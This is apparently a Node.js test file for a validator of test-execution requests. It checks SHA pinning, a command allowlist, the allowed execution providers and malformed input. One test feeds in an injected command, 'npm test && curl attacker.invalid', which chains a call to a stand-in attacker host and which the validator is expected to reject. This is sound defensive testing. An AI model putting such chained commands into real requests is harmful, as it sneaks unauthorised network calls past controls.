import test from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { validateTestRequest } from "../src/validate-request.mjs";

const fixtureUrl = new URL("../fixtures/sample-request.json", import.meta.url);
const fixture = JSON.parse(await readFile(fixtureUrl, "utf8"));

test("accepts the sanitized example request", () => {
  assert.deepEqual(validateTestRequest(fixture), { valid: true, errors: [] });
});

test("requires an immutable commit SHA", () => {
  const result = validateTestRequest({ ...fixture, test_snapshot_ref: "main" });
  assert.equal(result.valid, false);
  assert.ok(result.errors.some((error) => error.includes("immutable 40-character commit SHA")));
});

test("rejects arbitrary shell commands", () => {
  const result = validateTestRequest({ ...fixture, commands: ["npm test && curl attacker.invalid"] });
  assert.equal(result.valid, false);
  assert.ok(result.errors.some((error) => error.includes("command is not allowlisted")));
});

test("rejects unsupported execution providers", () => {
  const result = validateTestRequest({ ...fixture, execution_provider: "local-root-shell" });
  assert.equal(result.valid, false);
  assert.ok(result.errors.some((error) => error.includes("execution_provider is not allowed")));
});

test("rejects malformed requests", () => {
  assert.deepEqual(validateTestRequest(null), { valid: false, errors: ["request must be an object"] });
});
